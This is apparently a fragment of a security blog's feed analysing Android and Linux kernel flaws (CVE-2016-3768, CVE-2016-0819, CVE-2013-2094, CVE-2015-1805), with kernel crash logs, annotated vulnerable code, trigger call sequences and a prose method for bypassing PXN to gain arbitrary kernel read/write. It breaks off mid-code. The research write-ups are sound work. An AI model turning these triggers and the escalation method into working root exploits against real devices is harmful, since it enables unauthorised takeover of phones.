<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">[   50.803798] [idhyt] --- call perf_event_open ---</span><br><span class="line">[   50.806024] [idhyt] --- in perf_event_alloc --- </span><br><span class="line">[   50.806300] [idhyt] kzalloc event = e9859c00 </span><br><span class="line">[   50.817401] [idhyt] --- in armpmu_add --- </span><br><span class="line">[   50.817808] [idhyt] event = e9859c00, hwc(hw_perf_event) = e9859cd0, hw_events(pmu_hw_events) = c11a5a68</span><br><span class="line">[   50.819088] [idhyt] armpmu-&gt;get_event_idx = 0</span><br><span class="line">[   50.819315] [idhyt] c11a5a68-&gt;events[0] = e9859c00</span><br><span class="line">[   50.820089] [idhyt] call perf_event_open return, event_fd = 3, event = e9859c00, hw_perf_event = e9859cd0</span><br><span class="line">[   50.820505] [idhyt] --- call perf_event_open ---</span><br><span class="line">[   50.820736] [idhyt] --- in perf_event_alloc --- </span><br><span class="line">[   50.820966] [idhyt] kzalloc event = e9859800 </span><br><span class="line">[   50.831431] [idhyt] --- in armpmu_add --- </span><br><span class="line">[   50.831660] [idhyt] event = e9859800, hwc(hw_perf_event) = e98598d0, hw_events(pmu_hw_events) = c11a5a68</span><br><span class="line">[   50.832072] [idhyt] --- in msm_l2_test_set_ev_constraint --- </span><br><span class="line">[   50.832478] [idhyt] l2_pmu_constraints.pmu_bitmap = 0x1, bitmap_t = 0x1</span><br><span class="line">[   50.832710] [idhyt] perf_event = e9859800, set event-&gt;state = PERF_EVENT_STATE_OFF, event-&gt;attr.constraint_duplicate = 1</span><br><span class="line">[   50.833125] [idhyt] armpmu-&gt;get_event_idx = 1</span><br><span class="line">[   50.833354] [idhyt] c11a5a68-&gt;events[1] = e9859800</span><br><span class="line">[   50.834114] [idhyt] call perf_event_open return, event_fd = 4, event = e9859800, hw_perf_event = e98598d0</span><br><span class="line"></span><br><span class="line">[   50.834537] [idhyt] ioclt: PERF_EVENT_IOC_ENABLE</span><br><span class="line">[   50.835412] [idhyt] --- in armpmu_add --- </span><br><span class="line">[   50.835821] [idhyt] event = e9859800, hwc(hw_perf_event) = e98598d0, hw_events(pmu_hw_events) = c11a5a68</span><br><span class="line">[   50.836238] [idhyt] --- in msm_l2_test_set_ev_constraint --- </span><br><span class="line">[   50.836469] [idhyt] l2_pmu_constraints.pmu_bitmap = 0x1, bitmap_t = 0x1</span><br><span class="line">[   50.836878] [idhyt] perf_event = e9859800, set event-&gt;state = PERF_EVENT_STATE_OFF, event-&gt;attr.constraint_duplicate = 1</span><br><span class="line">[   50.837300] [idhyt] armpmu-&gt;get_event_idx = 2</span><br><span class="line">[   50.837530] [idhyt] c11a5a68-&gt;events[2] = e9859800</span><br><span class="line">[   50.837972] [idhyt] --- in perf_release func</span><br><span class="line">[   50.838202] [idhyt] event = e9859c00, event-&gt;state = 1</span><br><span class="line">[   50.854583] [idhyt] --- in perf_release func</span><br><span class="line">// // release events[1] !!!!!!</span><br><span class="line">[   50.854763] [idhyt] event = e9859800, event-&gt;state = -1 </span><br><span class="line"></span><br><span class="line">// // open new perf_event !!!!!!</span><br><span class="line">[   96.572065] [idhyt] --- call perf_event_open ---  </span><br><span class="line">[   96.572112] [idhyt] --- in perf_event_alloc --- </span><br><span class="line">[   96.572193] [idhyt] kzalloc event = e9859c00 </span><br><span class="line">[   96.572384] [idhyt] --- in perf_init_event --- </span><br><span class="line">[   96.572673] [idhyt] --- in armpmu_event_init --- </span><br><span class="line">[   96.573138] [idhyt] --- in armpmu_reserve_hardware ---</span><br><span class="line">[   96.573578] [idhyt] armpmu-&gt;request_pmu_irq</span><br><span class="line">[   96.573622] [idhyt] --- in krait_l2_handle_irq --- </span><br><span class="line">[   96.573662] [idhyt] idx = 1</span><br><span class="line">// // dereferencing the invalid pointer and crash!!!!!!</span><br><span class="line">[   96.573731] [idhyt] event =  krait_l2_pmu_hw_events.events[1] = e9859800  </span><br><span class="line">[   96.573771] [idhyt] armpmu_event_update</span><br><span class="line">[   96.573841] [idhyt] --- in armpmu_event_update --- </span><br><span class="line">[   96.573881] [idhyt] event = e9859800, event-&gt;state = 538976288, hwc(hw_perf_event) = e98598d0, idx = 1</span><br><span class="line">[   96.573954] Unable to handle kernel paging request at virtual address 202020d8</span><br><span class="line">[   96.573994] pgd = eb3fc000</span><br><span class="line">[   96.574063] [202020d8] *pgd=00000000</span><br><span class="line">[   96.574142] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[   96.574184] CPU: 0    Not tainted  (3.4.0-geaa8415-dirty #25)</span><br><span class="line">[   96.574262] PC is at armpmu_event_update+0x64/0x11c</span><br><span class="line">[   96.574307] LR is at console_unlock+0x2d8/0x330</span><br><span class="line">[   96.574378] pc : [&lt;c0116bf4&gt;]    lr : [&lt;c01ae924&gt;]    psr: 20000193</span><br><span class="line">[   96.574380] sp : ea739b68  ip : ea739a50  fp : ea739b9c</span><br><span class="line">[   96.574484] r10: e9859928  r9 : e98598d0  r8 : e9859800</span><br><span class="line">[   96.574524] r7 : 20202020  r6 : 00000001  r5 : 00000000  r4 : 00000000</span><br><span class="line">[   96.574594] r3 : 20202020  r2 : 9059756f  r1 : 60000193  r0 : 0000006d</span><br><span class="line">[   96.574634] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[   96.574705] Control: 10c5787d  Table: 337fc06a  DAC: 00000015</span><br><span class="line">[   96.574774] </span><br><span class="line">[   96.574776] PC: 0xc0116b74:</span><br><span class="line">[   96.574847] 6b74  ebffff8b eafffff7 00c95cc4 00c95cbc 00c95d04 00c95c98 00c95cd8 e1a0c00d</span><br><span class="line">[   96.575241] 6b94  e92ddff0 e24cb004 e24dd00c e52de004 e8bd4000 e1a08000 e59f00f0 e1a09001</span><br><span class="line">[   96.575608] 6bb4  e1a06002 e08f0000 eb28b0fd e59f00e0 e5982030 e1a03009 e58d6000 e1a01008</span><br><span class="line">[   96.576008] 6bd4  e08f0000 e598702c eb28b0f5 e5983030 e3530000 ba000029 e289a058 e1ba4f9f</span><br><span class="line">[   96.576376] 6bf4  e59730b8 e1a00006 e12fff33 e3a03000 e1a02000 f57ff05f e1ba0f9f e3a0c000</span><br><span class="line">[   96.576775] 6c14  e1300004 01310005 01aacf92 e35c0000 1afffff8 f57ff05f e1510005 01500004</span><br><span class="line">[   96.577145] 6c34  1affffed e1c709d0 e0524004 e0c35005 e288c038 e0000004 e0011005 e1bc4f9f</span><br><span class="line">[   96.577543] 6c54  e0944000 e0a55001 e1acef94 e33e0000 1afffff9 e289c070 e1bc4f9f e0544000</span><br><span class="line">[   96.577941] </span><br><span class="line">[   96.577942] LR: 0xc01ae8a4:</span><br><span class="line">[   96.578015] e8a4  e2800004 eb00a841 e1a00004 eb26ab59 e595200c e5953004 e1a00004 e1a01006</span><br><span class="line">[   96.578382] e8c4  e1520003 0a00000d eb26abe5 ebffff17 e3500000 0a00000d e3a03001 e50b3044</span><br><span class="line">[   96.578784] e8e4  eaffff6e e1a02000 e51b104c e24b0032 ebfffce9 e51b3048 e5932008 eaffffd2</span><br><span class="line">[   96.579154] e904  eb26abd7 e51b3044 e3530000 1affffee e51b3038 e3530000 0a000000 ebffff2b</span><br><span class="line">[   96.579553] e924  e24bd028 e89daff0 e7f001f2 e59f0040 e08f0000 e2800004 eb00a81c e24bd028</span><br><span class="line">[   96.579955] e944  e89daff0 011022d8 00f9d9b8 00f9d948 010030d4 00f9d934 010030bc 00f9d90c</span><br><span class="line">[   96.580325] e964  00f9d89c fff5179c 00f9d7dc 011020c0 01002f34 01002ea0 e1a0c00d e92ddff0</span><br><span class="line">[   96.580723] e984  e24cb004 e24dd074 e52de004 e8bd4000 e59f3630 e1a06000 e59f062c e1a05001</span><br><span class="line">[   96.581121]</span><br></pre></td></tr></table></figure>
<h2 id="cve-2016-0819">cve-2016-0819</h2><p>attr.disabled = 0;<br>attr.constraint_duplicate = 1;</p>
<p>fd =syscall(__NR_perf_event_open, &amp;attr, 0, -1, -1, 0);<br>enable: event-&gt;state = PERF_EVENT_STATE_ACTIVE;</p>
<p>ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);<br>disable: event-&gt;state = PERF_EVENT_STATE_OFF</p>
<p>close(fd);</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">perf_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> perf_event *event = file-&gt;private_data;</span><br><span class="line">    <span class="keyword">struct</span> task_struct *owner;</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">     * Event can be in state OFF because of a constraint check.</span><br><span class="line">     * Change to ACTIVE so that it gets cleaned up correctly.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="keyword">if</span> ((event-&gt;state == PERF_EVENT_STATE_OFF) &amp;&amp;</span><br><span class="line">        event-&gt;attr.constraint_duplicate)</span><br><span class="line">        event-&gt;state = PERF_EVENT_STATE_ACTIVE;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>if (event-&gt;attr.constraint_duplicate)<br>    event-&gt;state = PERF_EVENT_STATE_ACTIVE;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="title">event_sched_out</span><span class="params">(<span class="keyword">struct</span> perf_event *event,</span><br><span class="line">          <span class="keyword">struct</span> perf_cpu_context *cpuctx,</span><br><span class="line">          <span class="keyword">struct</span> perf_event_context *ctx)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    u64 tstamp = perf_event_time(event);</span><br><span class="line">    u64 delta;</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">     * An event which could not be activated because of</span><br><span class="line">     * filter mismatch still needs to have its timings</span><br><span class="line">     * maintained, otherwise bogus information is return</span><br><span class="line">     * via read() for time_enabled, time_running:</span><br><span class="line">     */</span></span><br><span class="line">    <span class="keyword">if</span> (event-&gt;state == PERF_EVENT_STATE_INACTIVE</span><br><span class="line">        &amp;&amp; !event_filter_match(event)) &#123;</span><br><span class="line">        delta = tstamp - event-&gt;tstamp_stopped;</span><br><span class="line">        event-&gt;tstamp_running += delta;</span><br><span class="line">        event-&gt;tstamp_stopped = tstamp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// !! should return, but event-&gt;state = PERF_EVENT_STATE_ACTIVE</span></span><br><span class="line">    <span class="keyword">if</span> (event-&gt;state != PERF_EVENT_STATE_ACTIVE)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    event-&gt;state = PERF_EVENT_STATE_INACTIVE;</span><br><span class="line">    <span class="keyword">if</span> (event-&gt;pending_disable) &#123;</span><br><span class="line">        event-&gt;pending_disable = <span class="number">0</span>;</span><br><span class="line">        event-&gt;state = PERF_EVENT_STATE_OFF;</span><br><span class="line">    &#125;</span><br><span class="line">    event-&gt;tstamp_stopped = tstamp;</span><br><span class="line">    event-&gt;pmu-&gt;del(event, <span class="number">0</span>);    <span class="comment">//  del again, crash !!!</span></span><br><span class="line">    event-&gt;oncpu = -<span class="number">1</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crash backtrace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">11831.615804</span>] [&lt;c0241d00&gt;] (perf_trace_del+<span class="number">0x20</span>/<span class="number">0x4c</span>) from [&lt;c0247f2c&gt;] (event_sched_out+<span class="number">0xb8</span>/<span class="number">0x13c</span>)</span><br><span class="line">[<span class="number">11831.615890</span>] [&lt;c0247f2c&gt;] (event_sched_out+<span class="number">0xb8</span>/<span class="number">0x13c</span>) from [&lt;c024af0c&gt;] (__perf_remove_from_context+<span class="number">0x58</span>/<span class="number">0x94</span>)</span><br><span class="line">[<span class="number">11831.615977</span>] [&lt;c024af0c&gt;] (__perf_remove_from_context+<span class="number">0x58</span>/<span class="number">0x94</span>) from [&lt;c02495fc&gt;] (remote_function+<span class="number">0x5c</span>/<span class="number">0x68</span>)</span><br><span class="line">[<span class="number">11831.616066</span>] [&lt;c02495fc&gt;] (remote_function+<span class="number">0x5c</span>/<span class="number">0x68</span>) from [&lt;c020403c&gt;] (smp_call_function_single+<span class="number">0x1d4</span>/<span class="number">0x228</span>)</span><br><span class="line">[<span class="number">11831.616158</span>] [&lt;c020403c&gt;] (smp_call_function_single+<span class="number">0x1d4</span>/<span class="number">0x228</span>) from [&lt;c0b0e284&gt;] (perf_remove_from_context+<span class="number">0x90</span>/<span class="number">0x170</span>)</span><br><span class="line">[<span class="number">11831.616247</span>] [&lt;c0b0e284&gt;] (perf_remove_from_context+<span class="number">0x90</span>/<span class="number">0x170</span>) from [&lt;c024bdb8&gt;] (perf_event_release_kernel+<span class="number">0x50</span>/<span class="number">0xa0</span>)</span><br><span class="line">[<span class="number">11831.616333</span>] [&lt;c024bdb8&gt;] (perf_event_release_kernel+<span class="number">0x50</span>/<span class="number">0xa0</span>) from [&lt;c024bee8&gt;] (perf_release+<span class="number">0xe0</span>/<span class="number">0x114</span>)</span><br><span class="line">[<span class="number">11831.616424</span>] [&lt;c024bee8&gt;] (perf_release+<span class="number">0xe0</span>/<span class="number">0x114</span>) from [&lt;c0298bfc&gt;] (fput+<span class="number">0xc8</span>/<span class="number">0x244</span>)</span><br><span class="line">[<span class="number">11831.616479</span>] [&lt;c0298bfc&gt;] (fput+<span class="number">0xc8</span>/<span class="number">0x244</span>) from [&lt;c0295ffc&gt;] (filp_close+<span class="number">0x74</span>/<span class="number">0x9c</span>)</span><br><span class="line">[<span class="number">11831.616563</span>] [&lt;c0295ffc&gt;] (filp_close+<span class="number">0x74</span>/<span class="number">0x9c</span>) from [&lt;c02960fc&gt;] (sys_close+<span class="number">0xd8</span>/<span class="number">0x110</span>)</span><br><span class="line">[<span class="number">11831.616651</span>] [&lt;c02960fc&gt;] (sys_close+<span class="number">0xd8</span>/<span class="number">0x110</span>) from [&lt;c0109b00&gt;] (ret_fast_syscall+<span class="number">0x0</span>/<span class="number">0x30</span>)</span><br><span class="line">[<span class="number">11831.616702</span>] Code: <span class="function">e1a03000 e590101c e5900240 <span class="title">e3520000</span> <span class="params">(e5812000)</span></span></span><br></pre></td></tr></table></figure>
<h2 id="cve-2013-2094">cve-2013-2094</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> static_key &#123;</span><br><span class="line">    <span class="keyword">atomic_t</span> enabled;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">static_key_slow_inc</span><span class="params">(<span class="keyword">struct</span> static_key *key)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    atomic_inc(&amp;key-&gt;enabled);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">perf_swevent_init</span><span class="params">(<span class="keyword">struct</span> perf_event *event)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> event_id = event-&gt;attr.config;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// if event_id &lt; 0 </span></span><br><span class="line">    <span class="keyword">if</span> (event_id &gt;= PERF_COUNT_SW_MAX)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (!event-&gt;parent) &#123;</span><br><span class="line">        <span class="keyword">int</span> err;</span><br><span class="line">        err = swevent_hlist_get(event);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        <span class="comment">// could inc op array out of bouds</span></span><br><span class="line">        static_key_slow_inc(&amp;perf_swevent_enabled[event_id]);</span><br><span class="line">        event-&gt;destroy = sw_perf_event_destroy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="cve-2016-3768">cve-2016-3768</h2><p>Due to the duplicate constraints, arch/arm/mach-msm/perf_event_msm_krait_l2.c<br>drivers marks the event as OFF but returns TRUE to perf_event.c which<br>goes ahead and allocates the hw_event and enables it.</p>
<p>Since event is marked OFF, kernel events core will try to enable this event<br>again during next perf_event_enable. Which results in same event enabled<br>on multiple hw_events. But during the perf_release, event struct is freed<br>and only one hw_event is released. This results in dereferencing the<br>invalid pointer and hence the crash.</p>]]>
    
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[绕过PXN保护]]></title>
    <link href="http://blog.idhyt.com/2016/08/09/exploit-bypass-pxn/"/>
    <id>http://blog.idhyt.com/2016/08/09/exploit-bypass-pxn/</id>
    <published>2016-08-09T14:31:11.000Z</published>
    <updated>2016-11-10T05:24:59.000Z</updated>
    <content type="html"><![CDATA[<p>7月1日 <a href="http://www.mosec.org/" target="_blank" rel="external">mosec2016移动安全技术峰会</a> 360的一篇议题 <a href="https://github.com/jianqiangzhao/mosec2016" target="_blank" rel="external">Android Root利用技术漫谈：绕过PXN</a> 介绍一种通用的绕过pxn的技术，有别于传统rop/jop技术，通过利用内核中现有的功能模块实现pxn的绕过，不再需要寻找构造rop了。<br><a id="more"></a></p>
<h2 id="利用逻辑">利用逻辑</h2><p>整个ppt用了很大的篇幅介绍了android漏洞利用的过程，而介绍这个新技术的就一页：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-bypass-pxn-01.png" alt="set_fs"></p>
<p>内核中一些函数调用了<code>set_fs(KERNEL_DS)</code>以后，由于代码逻辑问题导致在函数调用返回之前没有恢复原来的old_fs，看下set_fs(KERNEL_DS)汇编如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">STP             X29, X30, [SP,<span class="preprocessor">#-<span class="number">0x20</span>+var_s0]!</span></span><br><span class="line">MOV             X29, SP</span><br><span class="line">MOV             X3, SP</span><br><span class="line">STP             X19, X20, [SP,<span class="preprocessor">#var_s10]</span></span><br><span class="line">AND             X19, X3, <span class="preprocessor">#<span class="number">0xFFFFFFFFFFFFC000</span></span></span><br><span class="line">MOV             X3, <span class="preprocessor">#<span class="number">0xFFFFFFFFFFFFFFFF</span></span></span><br><span class="line">LDR             X20, [X19,<span class="preprocessor">#<span class="number">8</span>]</span></span><br><span class="line">STR             X3, [X19,<span class="preprocessor">#<span class="number">8</span>]</span></span><br><span class="line">...</span><br><span class="line">LDP             X19, X20, [SP,<span class="preprocessor">#var_s10]</span></span><br><span class="line">LDP             X29, X30, [SP+var_s0],<span class="preprocessor">#<span class="number">0x20</span></span></span><br></pre></td></tr></table></figure>
<p>该函数实现了patch addr_limit操作，将进程改为任意读写，所以控制eip后触发一下这个函数就具有了任意地址读写能力，从而不用再去寻找rop来实现该过程。</p>
<h2 id="总结">总结</h2><p>1.存在这种错误逻辑的函数本身就是一种漏洞，如果用户态进程能调用到该逻辑，直接就可以任意读写，完全不需要使用一个漏洞来配合跳转。</p>
<p>2.如果是在本进程控制的eip可以跳过去触发任意读写，但是如果控制的eip是在其他内核进程的话，这种做法是没有任何意义的。</p>
<p>3.任意读写之后还需要泄漏sp才能完成提权过程，后续泄漏sp还是需要rop做配合，所以这种方法也只是节省了一条rop，不过泄漏sp的rop比较容易找。当然也可通过暴力搜索获取当前的线程栈。</p>
<p>4.关于rop，其实找到几条之后还是比较通用的，可以写脚本去自动适配，用这个方法绕过pxn最理想的环境应该是：<br>控制的eip为当前进程 &amp;&amp; 无法控制其他寄存器构造rop</p>
<h2 id="思考">思考</h2><p>存在pxn的情况下，漏洞利用一般都是需要控制eip加上一个寄存器，这样后续可以构造rop来实现相关的提权操作，但只能控制eip的漏洞是无法很好的利用的，曾经我也是这样认为的。<br>但是最近找到了一种更通用的方法，不需要rop，不需要额外的寄存器，只要控制eip就可以进行提权，所以啊，漏洞利用真是一个容易打脸的事情。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>7月1日 <a href="http://www.mosec.org/">mosec2016移动安全技术峰会</a> 360的一篇议题 <a href="https://github.com/jianqiangzhao/mosec2016">Android Root利用技术漫谈：绕过PXN</a> 介绍一种通用的绕过pxn的技术，有别于传统rop/jop技术，通过利用内核中现有的功能模块实现pxn的绕过，不再需要寻找构造rop了。<br>]]>
    
    </summary>
    
      <category term="pxn" scheme="http://blog.idhyt.com/tags/pxn/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-1805]]></title>
    <link href="http://blog.idhyt.com/2016/07/07/exploit-cve-2015-1805/"/>
    <id>http://blog.idhyt.com/2016/07/07/exploit-cve-2015-1805/</id>
    <published>2016-07-07T13:42:11.000Z</published>
    <updated>2016-07-07T14:45:17.000Z</updated>
    <content type="html"><![CDATA[<p>在linux 内核3.16版本之前的fs/pipe.c当中，由于pipe_read和pipe_write没有考虑到拷贝过程中数据没有同步的一些临界情况,造成了拷贝越界的问题，因此有可能导致系统crash以及系统权限提升。这种漏洞又称之为”I/O vector array overrun”。</p>
<a id="more"></a>
<h2 id="漏洞代码">漏洞代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> iovec</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> __user *iov_base;  <span class="comment">/* BSD uses caddr_t (1003.1g requires void *) */</span></span><br><span class="line">    <span class="keyword">__kernel_size_t</span> iov_len; <span class="comment">/* Must be size_t (1003.1g) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> *  struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="line"> *  @page: the page containing the data for the pipe buffer</span><br><span class="line"> *  @offset: offset of data inside the @page</span><br><span class="line"> *  @len: length of data inside the @page</span><br><span class="line"> *  @ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="line"> *  @flags: pipe buffer flags. See above.</span><br><span class="line"> *  @private: private data owned by the ops.</span><br><span class="line"> **/</span></span><br><span class="line"><span class="keyword">struct</span> pipe_buffer &#123;</span><br><span class="line">    <span class="keyword">struct</span> page *page;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> pipe_buf_operations *ops;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> ssize_t</span><br><span class="line"><span class="title">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">const</span> <span class="keyword">struct</span> iovec *_iov,</span><br><span class="line">       <span class="keyword">unsigned</span> <span 